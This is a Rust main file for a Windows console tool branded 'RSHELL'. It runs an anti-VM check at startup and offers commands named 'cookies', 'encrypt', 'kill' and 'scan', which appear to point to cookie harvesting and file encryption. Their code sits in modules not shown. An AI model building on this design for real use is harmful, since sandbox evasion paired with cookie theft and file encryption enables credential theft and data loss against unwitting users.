use std::io::{self, Write, stdout};
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::um::wincon::SetConsoleTitleW;
use colored::*;

mod functions;
mod antivm;

fn main() -> io::Result<()> {
    // Check if the program is running in a VM
    antivm::kill();

    ansi_term::enable_ansi_support().unwrap();

    // Clear the command prompt
    print!("{}[2J", 27 as char);
    stdout().flush().unwrap();

    // Set the console title
    let new_title = "Nothing";
    let title: Vec<u16> = OsStr::new(new_title)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();
    unsafe { 
        SetConsoleTitleW(title.as_ptr()) 
    };

    let lines = [
        "",
        "",
        "     /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$ /$$       /$$      ",
        "    | $$__  $$ /$$__  $$| $$  | $$| $$_____/| $$      | $$      ",
        "    | $$  \\ $$| $$  \\__/| $$  | $$| $$      | $$      | $$      ",
        "    | $$$$$$$/|  $$$$$$ | $$$$$$$$| $$$$$   | $$      | $$      ",
        "    | $$__  $$ \\____  $$| $$__  $$| $$__/   | $$      | $$      ",
        "    | $$  \\ $$ /$$  \\ $$| $$  | $$| $$      | $$      | $$      ",
        "    | $$  | $$|  $$$$$$/| $$  | $$| $$$$$$$$| $$$$$$$$| $$$$$$$$",
        "    |__/  |__/ \\______/ |__/  |__/|________/|________/|________/",
        "",
    ];

    for line in &lines {
        println!("{}", line.truecolor(80, 12, 170));
    }

    loop {
        print!("{}", "          > ".truecolor(120, 120, 120));

        io::stdout().flush()?;

        let mut input = String::new();
        io::stdin().read_line(&mut input)?;

        let input = input.trim();

        let mut parts = input.split_whitespace();
        let command = parts.next().unwrap_or("");

        if input.is_empty() {
            // If the user didn't enter any input, print the prompt again and continue
            io::stdout().flush()?;
            continue;
        }
        
        match command {
            "exit" => {
                break;
            }
            "rm" | "del" => {
                functions::remove();
            }
            "tree" => {
                functions::tree()
            }
            "clear" | "cls" => {
                print!("{}[2J", 27 as char);
                stdout().flush().unwrap();
                for line in &lines {
                    println!("{}", line.truecolor(80, 12, 170));
                }
            }
            "find" => {
                functions::find();
            }
            "where" => {
                functions::whereis();
            }
            "scan" => {
                functions::scan();
            }
            "cookies" => {
                functions::cookies();
            }
            "encrypt" | "enc" => {
                functions::encrypt_file();
            }
            "help" => {
                functions::help();
            }
            "info" => {
                functions::info();
            }
            "kill" => {
                functions::kill();
            }
            _ => println!("{} Type '{}' for a list of commands.", "        Command not found.".truecolor(255, 0, 0), "help".truecolor(80, 0, 255)),
        }
    }
    Ok(())
}
